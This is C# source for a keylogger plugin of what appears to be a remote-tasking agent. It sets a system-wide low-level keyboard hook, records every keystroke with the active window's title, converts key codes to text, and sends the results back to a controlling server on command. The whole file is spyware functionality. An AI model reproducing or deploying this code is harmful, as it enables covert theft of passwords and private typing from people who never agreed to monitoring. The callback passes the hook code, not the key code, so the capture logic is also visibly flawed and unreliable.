using System.Collections.Concurrent;
using System.Diagnostics;
using System.Text;
using Agent.Interfaces;
using Agent.Models;
using Agent.Utilities;

namespace Agent
{
    public class Keystroke
    {
        public Keystroke(IntPtr hWin, int iKey)
        {
            windowHandle = hWin;
            keyCode = iKey;
        }
        public int keyCode { get; set; }
        public IntPtr windowHandle { get; set; }
        public string GetWindowTitle()
        {
            StringBuilder title = new StringBuilder(256);
            Native.GetWindowText(windowHandle, title, title.Capacity);

            if (title.Length > 0)
            {
                return title.ToString();
            }
            return string.Empty;
        }
    }

    public class Plugin : IPlugin
    {
        public string Name => "keylogger";
        private bool isRunning = false;
        public string task_id = String.Empty;
        public CancellationTokenSource cts = new CancellationTokenSource();
        private ConcurrentQueue<Keystroke> keyQueue = new ConcurrentQueue<Keystroke>();
        private delegate void KeyboardEvent();
        private event KeyboardEvent OnKbHappened;
        private IMessageManager messageManager { get; set; }

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
        {
            this.messageManager = messageManager;
        }
        public async Task Execute(ServerJob job)
        {
            Dictionary<string, string> args = Misc.ConvertJsonStringToDict(job.task.parameters);
            if (args["action"].ToLower() == "stop")
            {
                if (this.isRunning)
                {
                    cts.Cancel();
                    this.isRunning = false;
                    messageManager.WriteLine("Tasked to stop.", job.task.id, true);
                }
                else
                {
                    messageManager.WriteLine("Task is not running.", job.task.id, true);
                }
                return;
            }

            if(!this.isRunning)
            {
                cts = new CancellationTokenSource();
                StartKeylogger(job.task.id);
                messageManager.WriteLine("Keylogger started.", job.task.id, true);
            }
            else
            {
                messageManager.WriteLine("Already running", job.task.id, true);
            }
        }
        public bool StartKeylogger(string task_id)
        {
            this.isRunning = true;
            this.task_id = task_id;
            this.OnKbHappened += Kl_OnKbHappened;
            try
            {
                Native.HookProc callback = CallbackFunction;
                var module = Process.GetCurrentProcess().MainModule.ModuleName;
                var moduleHandle = Native.GetModuleHandle(module);
                var hook = Native.SetWindowsHookEx(Native.HookType.WH_KEYBOARD_LL, callback, moduleHandle, 0);
                while (!cts.Token.IsCancellationRequested)
                {
                    Native.PeekMessage(IntPtr.Zero, IntPtr.Zero, 0x100, 0x109, 0);
                    Thread.Sleep(5);
                }

                Native.UnhookWindowsHookEx(hook);

                messageManager.WriteLine("Finished executing.", task_id, true);
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Exception: {0}", ex.Message);
                Console.WriteLine("[X] Stack Trace: {0}", ex.StackTrace);
            }


            return true;
        }

        private void Kl_OnKbHappened()
        {
            Keystroke ks;

            if (this.keyQueue.TryDequeue(out ks)) {
                string key = ConvertKeyStroke(ks.keyCode);
                messageManager.AddKeystroke(ks.GetWindowTitle(), this.task_id, key);
            }
            return;
        }

        private string ConvertKeyStroke(int ks)
        {
            string key = string.Empty;
            bool shift = (Native.GetAsyncKeyState(0x10) & 0x8000) != 0;
            bool caps = Console.CapsLock;

            // Check if Key is an alphabet letter
            if (ks > 64 && ks < 91)
            {
                if (shift | caps)
                {
                    key = ((Native.AthenaKeys)ks).ToString();
                }
                else
                {
                    key = ((Native.AthenaKeys)ks).ToString().ToLower();
                }
            }
            else
            {
                switch (ks)
                {
                    case 8:
                        key = "<Backspace>";
                        break;
                    case 9:
                        key = "<Tab>";
                        break;
                    case 13:
                        key = "<Enter>";
                        break;
                    case 32:
                        key = "<Space Bar>";
                        break;
                    case 37:
                        key = "<Left>";
                        break;
                    case 38:
                        key = "<Up>";
                        break;
                    case 39:
                        key = "<Right>";
                        break;
                    case 40:
                        key = "<Down>";
                        break;
                    case 45:
                        key = "<Insert>";
                        break;
                    case 46:
                        key = "<Delete>";
                        break;
                    case 48:
                        key = shift ? ")" : "0";
                        break;
                    case 49:
                        key = shift ? "!" : "1";
                        break;
                    case 50:
                        key = shift ? "@" : "2";
                        break;
                    case 51:
                        key = shift ? "#" : "3";
                        break;
                    case 52:
                        key = shift ? "$" : "4";
                        break;
                    case 53:
                        key = shift ? "%" : "5";
                        break;
                    case 54:
                        key = shift ? "^" : "6";
                        break;
                    case 55:
                        key = shift ? "&" : "7";
                        break;
                    case 56:
                        key = shift ? "*" : "8";
                        break;
                    case 57:
                        key = shift ? "(" : "9";
                        break;
                    case 91:
                        key = "<Windows Key>";
                        break;
                    case 92:
                        key = "<Windows Key>";
                        break;
                    case 96:
                    case 97:
                    case 98:
                    case 99:
                    case 100:
                    case 101:
                    case 102:
                    case 103:
                    case 104:
                    case 105:
                        //Convert numpad keypress
                        key = (ks - 96).ToString();
                        break;
                    case 106:
                        key = "*";
                        break;
                    case 107:
                        key = "+";
                        break;
                    case 108:
                        key = "|";
                        break;
                    case 109:
                        key = "-";
                        break;
                    case 110:
                        key = ".";
                        break;
                    case 111:
                        key = "/";
                        break;
                    case 112:
                        key = "<F1>";
                        break;
                    case 113:
                        key = "<F2>";
                        break;
                    case 114:
                        key = "<F3>";
                        break;
                    case 115:
                        key = "<F4>";
                        break;
                    case 116:
                        key = "<F5>";
                        break;
                    case 117:
                        key = "<F6>";
                        break;
                    case 118:
                        key = "<F7>";
                        break;
                    case 119:
                        key = "<F8>";
                        break;
                    case 120:
                        key = "<F9>";
                        break;
                    case 121:
                        key = "<F10>";
                        break;
                    case 122:
                        key = "<F11>";
                        break;
                    case 123:
                        key = "<F12>";
                        break;
                    case 162:
                        key = "<Ctrl>";
                        break;
                    case 163:
                        key = "<Ctrl>";
                        break;
                    case 164:
                        key = "<Alt>";
                        break;
                    case 165:
                        key = "<Alt>";
                        break;
                    case 186:
                        key = shift ? ":" : ";";
                        break;
                    case 187:
                        key = shift ? "+" : "=";
                        break;
                    case 188:
                        key = shift ? "<" : ",";
                        break;
                    case 189:
                        key = shift ? "_" : "-";
                        break;
                    case 190:
                        key = shift ? ">" : ".";
                        break;
                    case 191:
                        key = shift ? "?" : "/";
                        break;
                    case 192:
                        key = shift ? "~" : "`";
                        break;
                    case 219:
                        key = shift ? "{" : "[";
                        break;
                    case 220:
                        key = shift ? "|" : "\\";
                        break;
                    case 221:
                        key = shift ? "}" : "]";
                        break;
                    case 222:
                        key = shift ? "<Double Quote>" : "<Single Quote>";
                        break;
                }
            }

            return key;
        }
        private IntPtr CallbackFunction(Int32 code, IntPtr wParam, IntPtr lParam)
        {
            if (code >= 0 && (wParam == 0x100 || wParam == 0x104))
            {
                IntPtr hWindow = Native.GetForegroundWindow();
                if (hWindow != IntPtr.Zero)
                {
                    Keystroke ks = new Keystroke(hWindow, code);
                    this.keyQueue.Enqueue(ks);
                    this.OnKbHappened?.Invoke();
                }

            }
            return Native.CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
        }
    }
}